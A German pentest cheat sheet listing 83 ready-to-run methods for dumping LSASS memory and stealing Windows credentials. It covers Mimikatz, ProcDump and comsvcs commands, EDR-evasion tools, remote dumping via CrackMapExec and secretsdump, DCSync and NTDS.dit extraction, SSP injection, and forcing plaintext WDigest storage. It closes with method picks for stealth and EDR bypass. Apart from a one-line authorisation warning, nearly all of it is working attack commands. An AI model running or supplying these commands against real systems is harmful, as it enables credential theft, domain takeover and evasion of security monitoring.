# LSASS Memory Dumping Methoden - Autorisierter Pentest Cheat Sheet

**Warnung**: Diese Methoden sind NUR für autorisierte Penetrationstests, CTF-Challenges, Sicherheitsforschung und forensische Analysen auf eigenen/genehmigten Systemen.

**Aktuelle LSASS PID**: 1216 (beispielhaft - mit `tasklist | findstr lsass.exe` prüfen)

---

## Inhaltsverzeichnis
1. [Native Windows Methoden](#native-windows-methoden)
2. [Sysinternals Tools](#sysinternals-tools)
3. [PowerShell Methoden](#powershell-methoden)
4. [C# / .NET Tools](#c-net-basierte-tools)
5. [Offensive Security Frameworks](#offensive-security-frameworks)
6. [Evasive / EDR-Umgehung](#evasive-edr-umgehung-techniken)
7. [Service Abuse / MalSecLogon](#service-abuse-malseclogon)
8. [Remote Dump Methoden](#remote-dump-methoden)
9. [Clone/Fork Techniken](#clonefork-techniken)
10. [Memory Reading ohne Dump](#memory-reading-ohne-dump)
11. [Weitere Tools](#weitere-tools)
12. [Windows Credential Manager](#windows-credential-manager)
13. [NTDS.dit Extraction](#ntdsdit-extraction-domain-controller)
14. [Volume Shadow Copy / Backup](#volume-shadow-copy-backup-methoden)
15. [Full RAM Dump](#full-ram-dump-lsass-extraktion)
16. [Hibernation File](#hibernation-file-methoden)
17. [Page File](#page-file-methoden)
18. [Crash Dump](#crash-dump-methoden)
19. [Registry Hive Dumps](#registry-hive-dumps)
20. [Live Memory Forensics](#live-memory-forensics)
21. [Exotic / Evasive](#exotic-evasive-methoden)
22. [Network-based Extraction](#network-based-extraction)
23. [Analyse nach dem Dump](#analyse-nach-dem-dump)

---

## Native Windows Methoden

### 1. comsvcs.dll (MiniDumpWriteDump)
**Beschreibung**: Native Windows-Methode ohne zusätzliche Tools
```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1216 lsass.dmp full
```
**Vorteile**: Nativ, kein zusätzliches Tool, diskret
**Nachteile**: Erfordert Admin-Rechte, wird von EDR erkannt

### 2. Task Manager
**Beschreibung**: GUI-basiert
- Task Manager öffnen (als Admin)
- Details → lsass.exe Rechtsklick → Create dump file
- Speichert in: `C:\Users\<user>\AppData\Local\Temp\`

**Vorteile**: Einfach, GUI
**Nachteile**: Hinterlässt Spuren, langsam

### 3. Windows Error Reporting (WerFault.exe)
```cmd
WerFault.exe -u -p 1216 -s 1234
```
**Vorteile**: Legitimer Windows-Prozess
**Nachteile**: Komplex in der Nutzung

### 4. SQLDumper.exe
**Beschreibung**: Wenn SQL Server installiert
```cmd
sqldumper.exe 1216 0 0x01100
```
**Vorteile**: Legitimes Tool
**Nachteile**: Benötigt SQL Server Installation

---

## Sysinternals Tools

### 5. ProcDump
**Beschreibung**: Industry Standard Tool
```cmd
procdump.exe -ma lsass.exe lsass.dmp
procdump.exe -ma 1216 lsass.dmp
procdump.exe -r -ma lsass.exe lsass.dmp  # Mit Reflection
```
**Vorteile**: Zuverlässig, Microsoft-signiert
**Nachteile**: Bekannt bei EDR

### 6. Process Explorer
**Beschreibung**: GUI-Tool
- Rechtsklick → Create Dump → Create Full Dump

**Vorteile**: Benutzerfreundlich
**Nachteile**: GUI-basiert

---

## PowerShell Methoden

### 7. PowerShell comsvcs.dll Wrapper
```powershell
$proc = Get-Process lsass
$dumpFile = "C:\temp\lsass.dmp"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $proc.Id $dumpFile full
```

### 8. Out-Minidump.ps1 (PowerSploit)
```powershell
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\
```

### 9. Invoke-NinjaCopy
**Beschreibung**: Kopiert auch von gesperrten Dateien
```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\lsass.exe" -LocalDestination "C:\temp\"
```

---

## C# / .NET basierte Tools

### 10. SharpDump
```cmd
SharpDump.exe 1216
```

### 11. SafetyDump
```cmd
SafetyDump.exe 1216
```

### 12. MiniDumpWriteDump API direkt (C#)
**Beschreibung**: Custom C# Implementation mit MiniDumpWriteDump API

### 13. SafetyKatz
**Beschreibung**: Kombination aus SharpKatz + Minidump in-memory
```cmd
SafetyKatz.exe
```
**Vorteile**: Läuft vollständig in-memory, PE-Reflection, kombiniert Dump + Parse
**Nachteile**: Größere Binary, höhere Detektionsrate

### 14. PPLDump
**Beschreibung**: Für PPL-geschütztes LSASS
```cmd
ppldump.exe lsass.exe lsass.dmp
```

---

## Offensive Security Frameworks

### 15. Mimikatz
```cmd
mimikatz.exe
sekurlsa::minidump lsass.dmp
```

### 16. Cobalt Strike BOF
```
nanodump
```

### 17. Metasploit
```ruby
use post/windows/gather/credentials/credential_collector
```

### 18. Sliver
```
procdump -p 1216 -o lsass.dmp
```

---

## Evasive / EDR-Umgehung Techniken

### 19. Silent Process Exit (Registry + WerFault)
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 2
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v DumpType /t REG_DWORD /d 2
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\temp"
taskkill /f /im lsass.exe
```

### 20. PssCaptureSnapshot API
**Beschreibung**: Nutzt PssCaptureSnapshot statt MiniDumpWriteDump

### 21. Direct System Calls (SysWhispers)
**Beschreibung**: Umgeht user-mode hooks durch direkte Syscalls

### 22. Shtinkering
```cmd
shtinkering.exe
```

### 23. HandleKatz
```cmd
handlekatz.exe
```

### 24. Dumpert (Direct Syscalls)
```cmd
Outflank-Dumpert.exe
```

### 25. EDRSandBlast + lsassy
```cmd
EDRSandblast.exe
lsassy -d . -u admin -p pass target
```

---

## Service Abuse / MalSecLogon

### 26. MalSecLogon
**Beschreibung**: Missbraucht den Secondary Logon Service zum LSASS-Dump
```cmd
# MalSecLogon erstellt Dump über Secondary Logon Service
MalSecLogon.exe
```
**Vorteile**: Nutzt legitimen Windows-Dienst, weniger verdächtig
**Nachteile**: Erfordert spezielle Privilegien
**Referenz**: James Forshaw's Technique

### 27. RunAs SSP Capture
**Beschreibung**: Fängt Credentials über runas ab
```cmd
runas /user:domain\user /savecred "cmd.exe"
```

---

## Remote Dump Methoden

### 28. lsassy (Remote über SMB)
```bash
lsassy -d domain -u user -p pass target.local
```

### 29. CrackMapExec
```bash
crackmapexec smb target.local -u user -p pass --lsa
crackmapexec smb target.local -u user -p pass -M lsassy
```

### 30. Impacket
```bash
secretsdump.py domain/user:pass@target.local
```

### 31. Invoke-Mimikatz Remote
```powershell
Invoke-Mimikatz -ComputerName target
```

---

## Clone/Fork Techniken

### 32. Process Forking/Cloning
**Beschreibung**: Klont LSASS-Prozess und dumpt den Klon

### 33. RtlCreateProcessReflection
**Beschreibung**: Reflektiert LSASS in neuen Prozess

---

## Memory Reading ohne Dump

### 34. Direkte Memory Read (ReadProcessMemory)
**Beschreibung**: Liest LSASS Memory direkt ohne Dump-Datei

### 35. Mimikatz sekurlsa::logonpasswords (Live)
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

### 36. pypykatz (Live Memory)
```bash
pypykatz live lsa
```

---

## Weitere Tools

### 37. NanoDump
```cmd
nanodump.exe --pid 1216 --write lsass.dmp
```

### 38. PPLKiller + Dump
```cmd
PPLKiller.exe /installDriver
procdump.exe -ma lsass.exe lsass.dmp
```

### 39. mimidrv.sys (Mimikatz Kernel Driver)
```cmd
mimikatz.exe "!+" "!processprotect /remove /process:lsass.exe"
```

---

## Windows Credential Manager

### 40. cmdkey (Native)
**Beschreibung**: Liste gespeicherte Credentials ohne LSASS-Zugriff
```cmd
# Credentials auflisten
cmdkey /list

# Credential hinzufügen (für Persistenz)
cmdkey /add:target /user:username /pass:password

# Credential löschen
cmdkey /delete:target
```
**Vorteile**: Nativ, keine Admin-Rechte benötigt für eigene Credentials
**Nachteile**: Nur eigene User-Credentials sichtbar

### 41. vaultcmd
**Beschreibung**: Zugriff auf Windows Vault (Credential Manager)
```cmd
# Vault Credentials auflisten
vaultcmd /listcreds:"Windows Credentials"
vaultcmd /listcreds:"Web Credentials"

# Alle Vaults anzeigen
vaultcmd /list
```

### 42. VaultPasswordView (NirSoft)
**Beschreibung**: GUI/CLI Tool für Vault-Extraction
```cmd
VaultPasswordView.exe /stext credentials.txt
```

### 43. PowerShell Credential Manager
```powershell
# Credentials aus Credential Manager lesen
$cred = Get-StoredCredential -Target "target"

# Alle Credentials auflisten
Get-StoredCredential
```

---

## NTDS.dit Extraction (Domain Controller)

### 44. ntdsutil (Native)
**Beschreibung**: Offizielles Microsoft Tool für DC-Maintenance
```cmd
# IFM (Install From Media) Dump erstellen
ntdsutil "ac i ntds" "ifm" "create full c:\temp\ntds" q q

# Alternativ: Nur NTDS ohne Registry
ntdsutil "ac i ntds" "ifm" "create sysvol full c:\temp\ntds" q q
```
**Vorteile**: Microsoft-Tool, legitim für Backups
**Nachteile**: Benötigt DC-Admin-Rechte, große Ausgabedatei

### 45. VSS + NTDS.dit Copy
**Beschreibung**: Volume Shadow Copy für NTDS.dit Extraktion
```cmd
# Shadow Copy erstellen
vssadmin create shadow /for=C:

# NTDS.dit aus Shadow Copy extrahieren
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Mit secretsdump analysieren
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### 46. diskshadow + NTDS
```cmd
# Script erstellen: ntds.txt
# set context persistent nowriters
# add volume c: alias someAlias
# create
# expose %someAlias% z:
# exec "cmd.exe" /c copy z:\Windows\NTDS\ntds.dit c:\temp\ntds.dit
# delete shadows volume %someAlias%
# reset

diskshadow /s ntds.txt
```

### 47. DCSync (Mimikatz/Impacket)
**Beschreibung**: Simuliert DC-Replication, kein NTDS.dit-Zugriff nötig
```cmd
# Mimikatz DCSync
mimikatz.exe "lsadump::dcsync /domain:contoso.local /user:Administrator"

# Impacket secretsdump (DCSync)
secretsdump.py -just-dc-ntlm domain/user:pass@dc.contoso.local

# Alle Hashes dumpen
secretsdump.py -just-dc domain/user:pass@dc.contoso.local
```
**Vorteile**: Kein Filesystem-Zugriff nötig, remote möglich
**Nachteile**: Benötigt Replication-Rechte (Domain Admin, Enterprise Admin, oder delegiert)

### 48. Invoke-DCSync (PowerShell)
```powershell
# PowerView/Empire
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:contoso.local /all /csv"'
```

### 49. CrackMapExec NTDS Dump
```bash
# Remote NTDS dump via CrackMapExec
crackmapexec smb dc.contoso.local -u admin -p pass --ntds
crackmapexec smb dc.contoso.local -u admin -p pass --ntds vss
```

---

## Volume Shadow Copy / Backup Methoden

### 50. Volume Shadow Copy Service (VSS)
**Beschreibung**: Erstellt Shadow Copy und extrahiert LSASS aus dem Snapshot
```cmd
# VSS Snapshot erstellen
wmic shadowcopy call create Volume='C:\'

# Alle Snapshots auflisten
vssadmin list shadows

# Shadow Copy mounten
mklink /d C:\shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# LSASS aus Shadow Copy extrahieren
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```
**Vorteile**: Weniger Detection, kein direkter LSASS-Zugriff
**Nachteile**: Erfordert Admin-Rechte, hinterlässt VSS-Logs

### 51. diskshadow.exe (Native VSS Tool)
```cmd
diskshadow.exe
> set context persistent
> add volume c: alias lsass
> create
> expose %lsass% z:
> exec copy z:\Windows\System32\lsass.exe C:\temp\lsass_copy.exe
```

### 52. vssown.vbs (VSS Exploitation)
```cmd
cscript vssown.vbs /start
cscript vssown.vbs /create
cscript vssown.vbs /list
```

### 53. Invoke-NinjaCopy (VSS + LSASS)
```powershell
Invoke-NinjaCopy -Path "C:\Windows\System32\lsass.exe" -LocalDestination "C:\temp\lsass.exe"
```

---

## Full RAM Dump + LSASS Extraktion

### 54. WinPmem (Full Physical Memory)
**Beschreibung**: Dumpt gesamten RAM (mehrere GB!)
```cmd
# Gesamten RAM dumpen
winpmem_mini_x64.exe memdump.raw

# Mit Volatility analysieren
volatility -f memdump.raw --profile=Win10x64 pslist
volatility -f memdump.raw --profile=Win10x64 memdump -p 1216 -D output/
```

### 55. DumpIt (Full Memory Dump)
```cmd
DumpIt.exe /O memdump.dmp
```

### 56. FTK Imager (RAM Acquisition)
**Beschreibung**: GUI Tool für Memory Dump
- File → Capture Memory → Speichert kompletten RAM

### 57. Magnet RAM Capture
```cmd
MagnetRAMCapture.exe
```

### 58. Belkasoft RAM Capturer
```cmd
RamCapture64.exe output.mem
```

### 59. LiME (Linux Memory Extractor)
**Beschreibung**: Für WSL/Linux
```bash
insmod lime.ko "path=/tmp/ram.dump format=raw"
```

---

## Hibernation File Methoden

### 60. hiberfil.sys (Hibernation File)
**Beschreibung**: Extrahiert LSASS aus Hibernation-Datei
```cmd
# Windows Hibernation aktivieren
powercfg /hibernate on

# Hibernation auslösen
shutdown /h

# hiberfil.sys kopieren (beim nächsten Boot)
copy C:\hiberfil.sys C:\temp\

# Mit Volatility analysieren
volatility -f hiberfil.sys --profile=Win10x64 hibinfo
volatility -f hiberfil.sys --profile=Win10x64 memdump -p 1216 -D output/
```
**Vorteile**: Offline-Analyse, keine direkte LSASS-Interaktion
**Nachteile**: Benötigt System-Neustart

### 61. Hibernation File Conversion
```cmd
imagecopy hiberfil.sys memory.raw
```

---

## Page File Methoden

### 62. pagefile.sys Analyse
**Beschreibung**: Extrahiert Credentials aus Page File
```cmd
# Page File kopieren (erfordert Special Boot)
# Im WinPE/Recovery Mode:
copy C:\pagefile.sys D:\backup\

# Strings extrahieren
strings64.exe -n 8 pagefile.sys > pagefile_strings.txt
```

### 63. Page File Dump mit RawCopy
```cmd
RawCopy64.exe /FileNamePath:C:\pagefile.sys /OutputPath:C:\temp\
```

---

## Crash Dump Methoden

### 64. Erzwungener System Crash Dump
**Beschreibung**: Erzeugt vollständigen Memory Dump durch System Crash
```cmd
# Registry einstellen für Full Memory Dump bei Crash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v CrashDumpEnabled /t REG_DWORD /d 1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CrashControl" /v DumpFile /t REG_EXPAND_SZ /d "%SystemRoot%\MEMORY.DMP"

# Crash manuell auslösen
notmyfault64.exe /crash
# oder Keyboard Crash: Hold Right-Ctrl + 2x Scroll Lock
```
**WARNUNG**: Führt zu System-Absturz!

### 65. User-Mode Crash Dump
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWORD /d 2
```

---

## Registry Hive Dumps

### 66. SAM & SYSTEM Hive (für Offline-Extraktion)
```cmd
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive

# Mit secretsdump.py auslesen
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

### 67. Registry Hive aus VSS
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
```

---

## Live Memory Forensics

### 68. Volatility Live (Direct Memory Access)
```bash
rekall -f /dev/pmem pslist
rekall -f /dev/pmem dumpprocess -p 1216
```

### 69. WinDbg (Live Kernel Debugging)
```cmd
# Kernel Debugging aktivieren
bcdedit /debug on
bcdedit /dbgsettings local

# WinDbg attached
.process /p /r <lsass_EPROCESS>
.dump /ma C:\temp\lsass.dmp
```

### 70. PCILeech (DMA Attack - Hardware)
**Beschreibung**: Hardware-basierter DMA-Angriff über PCIe/Thunderbolt
```cmd
pcileech.exe dump -device fpga -out memdump.raw
```
**Vorteile**: Umgeht alle Software-Schutzmaßnahmen
**Nachteile**: Benötigt spezielle Hardware

---

## Exotic / Evasive Methoden

### 71. LSASS Clone + Suspend Original
**Beschreibung**: Klont LSASS, dumpt Klon, Original läuft weiter

### 72. LSASS Memory über /proc (WSL)
```bash
cat /proc/<pid>/mem > lsass.mem
```

### 73. Kernel Callback Dump
**Beschreibung**: Kernel-mode driver registriert Callback und dumpt LSASS bei Events

### 74. ETW (Event Tracing for Windows) Hooking
**Beschreibung**: Hookt ETW Events und extrahiert Credentials bei Login

### 75. DPAPI Credential Extraction (ohne LSASS)
```cmd
mimikatz.exe "dpapi::masterkey /in:master.key /sid:S-1-5-21..."
```

### 76. Kerberos Ticket Extraction (Memory)
```cmd
mimikatz.exe "sekurlsa::tickets /export"
klist
```

### 77. Security Support Provider (SSP) Injection
**Beschreibung**: Injiziert eigene SSP DLL
```cmd
mimikatz.exe "misc::memssp"
# Credentials werden in C:\Windows\System32\mimilsa.log geloggt
```

### 78. WDigest Enablement + Cache
**Beschreibung**: Aktiviert WDigest für Plaintext Password Storage
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
# User muss sich neu einloggen
```

---

## Network-based Extraction

### 79. SMBExec + Remote Dump
```bash
smbexec.py domain/user:pass@target.local
# Im remote shell: comsvcs.dll dump
```

### 80. PsExec + Remote Dump
```cmd
psexec.exe \\target -u admin -p pass cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
```

---

## Analyse nach dem Dump

### 81. Mimikatz (Offline)
```cmd
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

### 82. pypykatz (Offline)
```bash
pypykatz lsa minidump lsass.dmp
```

### 83. Hashcat Extraction
```bash
# Nach pypykatz extraction
hashcat -m 1000 hashes.txt wordlist.txt
```

---

## Empfohlene Methoden für verschiedene Szenarien

### Schnellster Test
1. **Methode 1** (comsvcs.dll) - Nativ, schnell
2. **Methode 5** (ProcDump) - Zuverlässig

### Stealth/Evasion
1. **Methode 50-53** (VSS) - Weniger Detection
2. **Methode 26** (MalSecLogon) - Service Abuse
3. **Methode 71** (LSASS Clone) - Minimale EDR-Signatur
4. **Methode 60** (hiberfil.sys) - Offline

### Forensische Analyse
1. **Methode 54** (WinPmem) - Vollständiges Memory Image
2. **Methode 66** (Registry Hives) - Offline Hash Extraction

### EDR Testing
1. **Methode 19** (Silent Process Exit) - Advanced
2. **Methode 24** (Dumpert) - Direct Syscalls
3. **Methode 25** (EDRSandBlast) - EDR Bypass

### Domain Controller
1. **Methode 44** (ntdsutil) - Native DC Backup
2. **Methode 47** (DCSync) - Remote Replication
3. **Methode 45-46** (VSS + NTDS.dit) - Offline Extraction

### Credential Harvesting (Non-LSASS)
1. **Methode 40-43** (Credential Manager) - Native Windows Vault
2. **Methode 75** (DPAPI) - Encrypted Credentials
3. **Methode 76** (Kerberos Tickets) - Memory Extraction

---

## Wichtige Hinweise

- **Admin-Rechte erforderlich**: Fast alle Methoden benötigen Administrator- oder SYSTEM-Rechte
- **Antivirus/EDR**: Die meisten Tools werden von modernen EDR-Lösungen erkannt
- **Logging**: Windows Event Logs (Sysmon, Event ID 10) protokollieren LSASS-Zugriffe
- **PPL (Protected Process Light)**: Neuere Windows-Versionen schützen LSASS, erfordert Kernel-Driver
- **Credential Guard**: Verhindert LSASS-Zugriff komplett, nur Kerberos Tickets extrahierbar


